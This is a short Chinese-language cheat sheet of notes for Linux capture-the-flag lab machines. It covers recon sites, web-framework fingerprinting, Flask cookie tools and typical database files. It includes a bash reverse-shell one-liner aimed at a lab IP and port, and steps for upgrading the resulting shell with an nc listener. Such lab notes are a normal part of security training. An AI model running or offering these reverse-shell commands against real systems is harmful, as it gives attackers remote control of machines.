## Linux_Medium
### https:// ippsec.rocks 搜索关键词漏洞 
### https://crackstation.net/ 解编码

#### 通过Web的404可以知道web的框架；如Flask为python;flask-unsign是用来解析Flask应用的签名cookie的
```
Google搜索：0xdf 404 templates

https://0xdf.gitlab.io/cheatsheets/404
```
|在这种 Flask / 轻量项目里，最常见几种是：|
|方式	|典型文件|
|SQLite	|db.sqlite3, database.db|
|JSON 存储	|db.json, users.json, data.json|
|YAML	|config.yaml|

#### 反弹
```
/bin/bash -c '/bin/bash -i >& /dev/tcp/10.10.15.132/9011 0>&1'

python3 -c 'import pty;pty.spawn("/bin/bash")'
web@Imagery:~/web$ ^Z
[1]+  Stopped                 nc -lvnp 9011
[★]$ stty raw -echo;fg
nc -lvnp 9011
             export TERM=xterm
```
#### env
```
[★]$ python3 -m venv .venv
[★]$ source .venv/bin/activate
```
